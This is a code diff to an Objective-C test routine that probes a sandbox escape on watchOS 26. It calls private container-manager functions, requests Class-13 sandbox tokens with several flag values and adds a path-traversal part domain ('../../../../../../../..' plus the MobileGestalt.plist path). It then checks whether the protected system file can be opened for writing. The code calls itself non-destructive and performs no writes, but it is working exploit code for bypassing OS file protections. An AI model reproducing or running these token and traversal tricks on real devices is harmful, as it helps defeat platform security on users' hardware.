@@ -12,14 +12,15 @@
 #import <unistd.h>
 
 // Non-destructive METHOD TEST, manually triggered by user.
-// Tries two existing *direct* MCM class-13 token issuance variants for the
-// known MobileGestalt SystemGroup, then checks effective write-open access.
+// Checks direct Class-13 queries and the distinct, file-scoped bad_query form
+// from WorstGestalt. Tests effective write-open after token consumption.
 // This file never calls write(), pwrite(), ftruncate(), unlink(), rename(),
 // symlink(), or any cache rebuild function.
 
 typedef void *(*BQWOCreate)(void);
 typedef void (*BQWOSetNumber)(void *, uint64_t);
 typedef void (*BQWOSetObject)(void *, void *);
+typedef void (*BQWOSetPartDomain)(void *, const char *);
 typedef void *(*BQWOResult)(void *);
 typedef char *(*BQWOToken)(void *);
 typedef void (*BQWOFree)(void *);
@@ -74,7 +75,7 @@ static NSString *BQWOMetadata(NSString *path) {
 
 NSString *BQRunKAMUI26WriteOpenTest(void) {
     NSMutableArray<NSString *> *out = [NSMutableArray arrayWithObjects:
-        @"=== watchOS26: class13 system-group write-open method test ===",
+        @"=== watchOS26: Class 13 direct + file-scoped write-open test v2 ===",
         @"Target: existing MobileGestalt.plist only.",
         @"NO symlinks, NO file creates, NO write() or cache modifications.",
         @"An allowed O_WRONLY alone does not prove safe persistent MG writes.",
@@ -96,6 +97,9 @@ NSString *BQRunKAMUI26WriteOpenTest(void) {
     BQWOSetObject setIDs = (BQWOSetObject)dlsym(mgr, "container_query_set_group_identifiers");
     BQWOSetNumber setPart = (BQWOSetNumber)dlsym(mgr, "container_query_operation_set_part");
     BQWOSetNumber setFlags = (BQWOSetNumber)dlsym(mgr, "container_query_operation_set_flags");
+    BQWOSetPartDomain setPartDomain = (BQWOSetPartDomain)dlsym(mgr, "container_query_operation_set_part_domain");
+    if (!setPartDomain)
+        setPartDomain = (BQWOSetPartDomain)dlsym(mgr, "container_query_set_part_domain");
     BQWOResult one = (BQWOResult)dlsym(mgr, "container_query_get_single_result");
     BQWOToken token = (BQWOToken)dlsym(mgr, "container_copy_sandbox_token");
     BQWOFree releaseQuery = (BQWOFree)dlsym(mgr, "container_query_free");
@@ -116,13 +120,37 @@ NSString *BQRunKAMUI26WriteOpenTest(void) {
     } else {
         [out addObject:[NSString stringWithFormat:@"Baseline policy=%@ write-open=%@",
                         BQWOSandboxStatus(check, path), BQWOOpenOnly(path)]];
-        const struct { const char *name; uint64_t flags; } cases[] = {
-            {"KAMUI-direct", 0x8100000000ULL},
-            {"watchOS26-alternate", 0x0800000000ULL}
-        };
-        for (size_t i = 0; i < sizeof(cases)/sizeof(cases[0]); ++i) {
-            [out addObject:[NSString stringWithFormat:@"\n[%s flag=0x%llx]",
-                            cases[i].name, (unsigned long long)cases[i].flags]];
+        // WorstGestalt's distinct file-scoped backend uses flag 0x8000000000,
+        // which is NOT the direct 0x800000000 token case. It supplies an
+        // eight-parent part domain ending in the existing target file path.
+        // The alternate /var form is a path alias, not another write target.
+        NSString *varPath = path;
+        if ([path hasPrefix:@"/private/var/"]) {
+            varPath = [@"/var/" stringByAppendingString:
+                [path substringFromIndex:@"/private/var/".length]];
+        }
+        NSString *parentSteps = @"../../../../../../../..";
+        NSArray<NSDictionary<NSString *, id> *> *cases = @[
+            @{@"name": @"KAMUI-direct", @"flags": @(0x8100000000ULL), @"domain": @"", @"file": path},
+            @{@"name": @"watchOS26-direct-alternate", @"flags": @(0x0800000000ULL), @"domain": @"", @"file": path},
+            @{@"name": @"WorstGestalt-file-var", @"flags": @(0x8000000000ULL),
+              @"domain": [parentSteps stringByAppendingString:varPath], @"file": varPath},
+            @{@"name": @"WorstGestalt-file-private-var", @"flags": @(0x8000000000ULL),
+              @"domain": [parentSteps stringByAppendingString:path], @"file": path}
+        ];
+        for (NSDictionary<NSString *, id> *test in cases) {
+            NSString *name = test[@"name"];
+            NSString *domain = test[@"domain"];
+            NSString *testFile = test[@"file"];
+            uint64_t flags = [test[@"flags"] unsignedLongLongValue];
+            [out addObject:[NSString stringWithFormat:@"\n[%@ flag=0x%llx]",
+                            name, (unsigned long long)flags]];
+            if (domain.length && !setPartDomain) {
+                [out addObject:@"SKIP: part-domain symbol unavailable"];
+                continue;
+            }
+            [out addObject:[NSString stringWithFormat:@"mode=%@ tested-file=%@",
+                domain.length ? @"file-scoped part-domain" : @"direct SystemGroup", testFile]];
             void *q = create();
             if (!q) {
                 [out addObject:@"query-create=FAILED"];
@@ -137,7 +165,8 @@ NSString *BQRunKAMUI26WriteOpenTest(void) {
             setClass(q, 13);
             setIDs(q, group);
             setPart(q, 3);
-            setFlags(q, cases[i].flags);
+            if (domain.length) setPartDomain(q, domain.UTF8String);
+            setFlags(q, flags);
             xpcRelease(group);
             void *res = one(q);
             [out addObject:[NSString stringWithFormat:@"MCM result=%@", res ? @"YES" : @"NO"]];
@@ -151,7 +180,7 @@ NSString *BQRunKAMUI26WriteOpenTest(void) {
                                 h >= 0 ? @"SUCCESS" : [NSString stringWithFormat:@"FAILED errno=%d (%s)", err, strerror(err)]]];
                 if (h >= 0) {
                     [out addObject:[NSString stringWithFormat:@"while consumed: policy=%@ write-open=%@",
-                                    BQWOSandboxStatus(check, path), BQWOOpenOnly(path)]];
+                                    BQWOSandboxStatus(check, testFile), BQWOOpenOnly(testFile)]];
                     int64_t released = release(h);
                     [out addObject:[NSString stringWithFormat:@"release=%lld", (long long)released]];
                     [out addObject:[NSString stringWithFormat:@"after release: policy=%@",
@@ -161,6 +190,7 @@ NSString *BQRunKAMUI26WriteOpenTest(void) {
             }
             releaseQuery(q);
         }
+        [out addObject:@"\nA token, or even a consumed extension, is not a successful write-open."];
     }
     if (sb) dlclose(sb);
     dlclose(mgr);
